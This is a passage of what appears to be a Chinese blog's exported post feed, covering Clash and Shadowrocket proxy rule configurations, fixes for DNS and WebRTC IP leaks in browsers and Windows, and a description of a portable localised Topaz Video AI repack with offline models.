class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/DiscoveryPlus/DiscoveryPlus.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/Discovery_Plus</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Disney Plus:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/Disney/Disney.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/Disney_Plus</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">encoreTVB:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/EncoreTVB/EncoreTVB.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/encoreTVB</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Fox Now:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/FOXNOW/FOXNOW.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/Fox_Now</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="string">Fox+:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/FOXPlus/FOXPlus.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/Fox+</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">HBO Go:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/HBOUSA/HBOUSA.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/HBO_Go</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">HBO Max:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/HBOAsia/HBOAsia.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/HBO_Max</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Hulu Japan:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/HuluJP/HuluJP.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/Hulu_Japan</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Hulu:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/Hulu/Hulu.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/Hulu</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Japonx:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/Japonx/Japonx.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/Japonx</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">JOOX:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/JOOX/JOOX.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/JOOX</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">KKBOX:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/KKBOX/KKBOX.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/KKBOX</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">KKTV:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/KKTV/KKTV.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/KKTV</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Line TV:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/LineTV/LineTV.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/Line_TV</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">myTV SUPER:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/myTVSUPER/myTVSUPER.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/myTV_SUPER</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Niconico:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/Niconico/Niconico.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/Niconico</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Pandora:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/Pandora/Pandora.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/Pandora</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">PBS:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/PBS/PBS.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/PBS</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Pornhub:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://fastly.jsdelivr.net/gh/dler-io/Rules@main/Clash/Provider/Media/Pornhub.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/Pornhub</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Soundcloud:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/SoundCloud/SoundCloud.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/Soundcloud</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">ViuTV:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/ViuTV/ViuTV.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Media/ViuTV</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Telegram:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/Telegram/Telegram.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Telegram</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Discord:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/Discord/Discord.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Discord</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Steam:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/Steam/Steam.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Steam</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Speedtest:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/Speedtest/Speedtest.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Speedtest</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">PayPal:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/PayPal/PayPal.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/PayPal</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Microsoft:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/Microsoft/Microsoft.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Microsoft</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">PROXY01:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/Proxy/Proxy.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Proxy</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">PROXY02:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">domain</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/Proxy/Proxy_Domain.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Proxy</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Domestic:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/ChinaMax/ChinaMax_Classical.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Domestic</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Apple:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/Apple/Apple.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Apple</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Google FCM:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/GoogleFCM/GoogleFCM.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Google</span> <span class="string">FCM</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Scholar:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/Scholar/Scholar.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Scholar</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">Domestic IPs:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">ipcidr</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/ChinaMax/ChinaMax_IP.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/Domestic_IPs</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br><span class="line">  <span class="attr">LAN:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">classical</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">https://raw.githubusercontent.com/blackmatrix7/ios_rule_script/master/rule/Clash/Lan/Lan.yaml</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./Rules/LAN</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br></pre></td></tr></table></figure>
<p>配置文件到此完毕。我知道这份配置文档会有错误和不是很优化的地方，如果您发现了，真的希望告知得于修正，再次感谢各位大佬们的辛苦付出。致谢。</p>
]]></content>
      <categories>
        <category>proxy</category>
        <category>clash</category>
      </categories>
      <tags>
        <tag>proxy</tag>
        <tag>clash</tag>
      </tags>
  </entry>
  <entry>
    <title>shadowrocket 配置解决dns泄漏问题</title>
    <url>/posts/f08be643/</url>
    <content><![CDATA[<p>小火箭远程配置文件：<a href="https://cf.buliang0.cf/shadowrocket-rules/nodnsleak-pk.ini">https://cf.buliang0.cf/shadowrocket-rules/nodnsleak-pk.ini</a><br>查询dns泄漏：<a href="https://ipleak.net/">https://ipleak.net</a></p>
<p><a href="https://ipcheck.ing/#/">IPCheck.ing - 查看我的 IP 地址 - 查询本机 IP 地址及归属地 - 查看 WebRTC 连接 IP - DNS 泄露检测 - 网速测试 - Jason Ng 阿禅开源作品</a></p>
<p>查ip：<a href="http://ip111.cn/">http://ip111.cn/</a> 或者 <a href="https://ip.skk.moe/">https://ip.skk.moe/</a></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Shadowrocket配置文件,解决DNS泄露</span></span><br><span class="line"></span><br><span class="line"><span class="section">[General]</span></span><br><span class="line"><span class="attr">bypass-system</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">skip-proxy</span> = <span class="number">192.168</span>.<span class="number">0.0</span>/<span class="number">16</span>, <span class="number">10.0</span>.<span class="number">0.0</span>/<span class="number">8</span>, <span class="number">172.16</span>.<span class="number">0.0</span>/<span class="number">12</span>, localhost, *.local, captive.apple.com</span><br><span class="line"><span class="attr">tun-excluded-routes</span> = <span class="number">10.0</span>.<span class="number">0.0</span>/<span class="number">8</span>, <span class="number">100.64</span>.<span class="number">0.0</span>/<span class="number">10</span>, <span class="number">127.0</span>.<span class="number">0.0</span>/<span class="number">8</span>, <span class="number">169.254</span>.<span class="number">0.0</span>/<span class="number">16</span>, <span class="number">172.16</span>.<span class="number">0.0</span>/<span class="number">12</span>, <span class="number">192.0</span>.<span class="number">0.0</span>/<span class="number">24</span>, <span class="number">192.0</span>.<span class="number">2.0</span>/<span class="number">24</span>, <span class="number">192.88</span>.<span class="number">99.0</span>/<span class="number">24</span>, <span class="number">192.168</span>.<span class="number">0.0</span>/<span class="number">16</span>, <span class="number">198.51</span>.<span class="number">100.0</span>/<span class="number">24</span>, <span class="number">203.0</span>.<span class="number">113.0</span>/<span class="number">24</span>, <span class="number">224.0</span>.<span class="number">0.0</span>/<span class="number">4</span>, <span class="number">255.255</span>.<span class="number">255.255</span>/<span class="number">32</span>, <span class="number">239.255</span>.<span class="number">255.250</span>/<span class="number">32</span></span><br><span class="line"><span class="attr">dns-server</span> = system</span><br><span class="line"><span class="attr">ipv6</span> = <span class="literal">false</span></span><br><span class="line"><span class="attr">prefer-ipv6</span> = <span class="literal">false</span></span><br><span class="line"><span class="attr">dns-fallback-system</span> = <span class="literal">false</span></span><br><span class="line"><span class="attr">dns-direct-system</span> = <span class="literal">false</span></span><br><span class="line"><span class="attr">icmp-auto-reply</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">always-reject-url-rewrite</span> = <span class="literal">false</span></span><br><span class="line"><span class="attr">private-ip-answer</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">dns-direct-fallback-proxy</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="section">[Rule]</span></span><br><span class="line">RULE-SET,https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/LocalAreaNetwork.list,DIRECT</span><br><span class="line">RULE-SET,https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/UnBan.list,DIRECT</span><br><span class="line">RULE-SET,https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/ChinaDomain.list,DIRECT</span><br><span class="line">RULE-SET,https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/ChinaMedia.list,DIRECT</span><br><span class="line">RULE-SET,https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/BanAD.list,REJECT</span><br><span class="line">RULE-SET,https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/BanProgramAD.list,REJECT</span><br><span class="line">RULE-SET,https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/ChinaCompanyIp.list,DIRECT</span><br><span class="line">RULE-SET,https://raw.githubusercontent.com/ACL4SSR/ACL4SSR/master/Clash/ChinaIp.list,DIRECT</span><br><span class="line">GEOIP,CN,DIRECT,no-resolve</span><br><span class="line">FINAL,PROXY</span><br><span class="line"></span><br><span class="line"><span class="section">[Host]</span></span><br><span class="line"><span class="attr">localhost</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"></span><br><span class="line"><span class="section">[URL Rewrite]</span></span><br><span class="line">^https?://(www.)?g.cn https://www.google.com 302</span><br><span class="line">^https?://(www.)?google.cn https://www.google.com 302</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>proxy</category>
        <category>shadowrocket</category>
      </categories>
      <tags>
        <tag>proxy</tag>
        <tag>shadowrocket</tag>
      </tags>
  </entry>
  <entry>
    <title>解决浏览器webrtc绕过代理泄漏本机真实IP问题</title>
    <url>/posts/84c3202c/</url>
    <content><![CDATA[<h1 id="查WebRTC"><a href="#查WebRTC" class="headerlink" title="查WebRTC"></a>查WebRTC</h1><p><a href="https://ip.voidsec.com/">https://ip.voidsec.com/</a><br><a href="https://browserleaks.com/webrtc">https://browserleaks.com/webrtc</a></p>
<p><a href="https://ipcheck.ing/#/">IPCheck.ing - 查看我的 IP 地址 - 查询本机 IP 地址及归属地 - 查看 WebRTC 连接 IP - DNS 泄露检测 - 网速测试 - Jason Ng 阿禅开源作品</a></p>
<h1 id="WebRTC-in-Firefox"><a href="#WebRTC-in-Firefox" class="headerlink" title="WebRTC in Firefox"></a>WebRTC in Firefox</h1><p>在地址栏输入以下回车 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">about:config</span><br></pre></td></tr></table></figure>
<p>在搜索栏输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">media.peerconnection.enabled</span><br></pre></td></tr></table></figure>
<p>双击优先权的值变成false</p>
<h1 id="WebRTC-in-Chrome-Edge"><a href="#WebRTC-in-Chrome-Edge" class="headerlink" title="WebRTC in Chrome &#x2F; Edge"></a>WebRTC in Chrome &#x2F; Edge</h1><p>安装插件</p>
<h2 id="webrtc-network-limiter"><a href="#webrtc-network-limiter" class="headerlink" title="webrtc-network-limiter"></a>webrtc-network-limiter</h2><p><a href="https://chrome.google.com/webstore/detail/webrtc-network-limiter/npeicpdbkakmehahjeeohfdhnlpdklia?utm_source=chrome-ntp-icon">https://chrome.google.com/webstore/detail/webrtc-network-limiter/npeicpdbkakmehahjeeohfdhnlpdklia?utm_source=chrome-ntp-icon</a></p>
<h2 id="webrtc-control"><a href="#webrtc-control" class="headerlink" title="webrtc-control"></a>webrtc-control</h2><p><a href="https://microsoftedge.microsoft.com/addons/detail/webrtc-control/eepeadgljpkkjpbfecfkijnnliikglpl">https://microsoftedge.microsoft.com/addons/detail/webrtc-control/eepeadgljpkkjpbfecfkijnnliikglpl</a></p>
<h2 id="webrtc-leak-prevent"><a href="#webrtc-leak-prevent" class="headerlink" title="webrtc-leak-prevent"></a>webrtc-leak-prevent</h2><p><a href="https://chrome.google.com/webstore/detail/webrtc-leak-prevent/eiadekoaikejlgdbkbdfeijglgfdalml?utm_source=chrome-ntp-icon">https://chrome.google.com/webstore/detail/webrtc-leak-prevent/eiadekoaikejlgdbkbdfeijglgfdalml?utm_source=chrome-ntp-icon</a></p>
<h1 id="WebRTC-in-Google-Chrome-on-Android"><a href="#WebRTC-in-Google-Chrome-on-Android" class="headerlink" title="WebRTC in Google Chrome on Android"></a>WebRTC in Google Chrome on Android</h1><p>地址栏输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chrome://flags/#disable-webrtc</span><br></pre></td></tr></table></figure>
<p>在“Disable WebRTC“下面单机“Enable”，重启浏览器<br><img src="/img/webrtc/1.webp" alt="web_rtc_on_android"></p>
]]></content>
      <categories>
        <category>web</category>
        <category>hack</category>
        <category>leak</category>
        <category>webrtc</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>hack</tag>
        <tag>leak</tag>
        <tag>webrtc</tag>
      </tags>
  </entry>
  <entry>
    <title>windows 禁用多网卡的dns请求，解决dns泄漏问题</title>
    <url>/posts/cc0b4a08/</url>
    <content><![CDATA[<p>Windows 搜索 组策略——管理模板——网络——DNS客户端——禁用智能多宿主名称解析——已启用<br><img src="/img/dns/1.webp" alt="微信截图_20230507135824"></p>
<p><a href="https://ipcheck.ing/#/">IPCheck.ing - 查看我的 IP 地址 - 查询本机 IP 地址及归属地 - 查看 WebRTC 连接 IP - DNS 泄露检测 - 网速测试 - Jason Ng 阿禅开源作品</a></p>
]]></content>
      <categories>
        <category>os</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>topaz video ai 3.2.4免安装中文汉化便携版+离线模型包</title>
    <url>/posts/4d042925/</url>
    <content><![CDATA[<h1 id="Topaz-Video-AI-3-2-4中文版是一款非常好用的视频分辨率放大专业软件-，可以通过这款软件将视频的分辨率进行自定义调节，最高能够将其放大至8K分辨率，并提供真实的细节和动作一致性，放大后的视频不会出现模糊的情况。软件通过对数以千计的视频进行训练测试，并结合来自多个输入视频帧的信息才得到如此强大的效果。"><a href="#Topaz-Video-AI-3-2-4中文版是一款非常好用的视频分辨率放大专业软件-，可以通过这款软件将视频的分辨率进行自定义调节，最高能够将其放大至8K分辨率，并提供真实的细节和动作一致性，放大后的视频不会出现模糊的情况。软件通过对数以千计的视频进行训练测试，并结合来自多个输入视频帧的信息才得到如此强大的效果。" class="headerlink" title="Topaz Video AI 3.2.4中文版是一款非常好用的视频分辨率放大专业软件 ，可以通过这款软件将视频的分辨率进行自定义调节，最高能够将其放大至8K分辨率，并提供真实的细节和动作一致性，放大后的视频不会出现模糊的情况。软件通过对数以千计的视频进行训练测试，并结合来自多个输入视频帧的信息才得到如此强大的效果。"></a>Topaz Video AI 3.2.4中文版是一款非常好用的视频分辨率放大专业软件 ，可以通过这款软件将视频的分辨率进行自定义调节，最高能够将其放大至8K分辨率，并提供真实的细节和动作一致性，放大后的视频不会出现模糊的情况。软件通过对数以千计的视频进行训练测试，并结合来自多个输入视频帧的信息才得到如此强大的效果。</h1><p>此版本为免安装汉化版，解压后打开即用！注意：不能放在C:\Program Files目录,其他位置都能放，上级目录不能有中文，否则会报错！<br>v3.2.4主要变化<br>添加了一个更快的 Apollo 版本，可以生成高达 4 倍的慢动作 (Apollo Fast)<br>添加了在首选项中使用旧模型的能力<br>添加 .m2t 作为可接受的文件扩展名<br>添加了更好的错误消息<br>添加了一些日志记录改进和修复<br>增加了最大进程的限制，并对更高设置发出警告<br>SMPTE 时间戳转换已修复<br>修复了循环预览时拆分视图分隔线重置问题<br>可以通过直接修改 JSON 文件来侧面加载旧模型<br>杂项更新<br>已知的问题<br>超过 8K 显示分辨率的输出可能会发生预览不匹配<br>运行要求<br>仅适用Windows 10 或更高版64位<br>CPU：最低需要支持AVX指令的 Intel i3 或 AMD Ryzen 3 及更高版(3.0GHz+)<br>显卡：最低需要支持 OpenGL 3.3 或更高版的 Nvidia GTX 740 或 AMD 5870<br>此软件比较吃配置！建议高配电脑使用！如果提示Driver Error的，请升级您的显卡驱动到最新！<br>便携版已经去除升级提示！离线模型包目前3.x版本是通用的！<br>离线模型放置方法：<br>下载17G离线模型包后解压,将模型文件全部复制放在如下文件夹：<br>\TopazVideoAI-3.2.4-CN-Portable\TopazVideoAI\App\Topaz Labs LLC\Topaz Video AI目录下<br>接反馈，便携版部分用户在使用过程中如果模型有报错，请删除模型联网下载使用！挂梯子模型下载更快请知悉！<br>之前下载过老版本的，如果您使用的模型无问题，一定做好备份，下次升级复制到模型文件夹也能使用！</p>
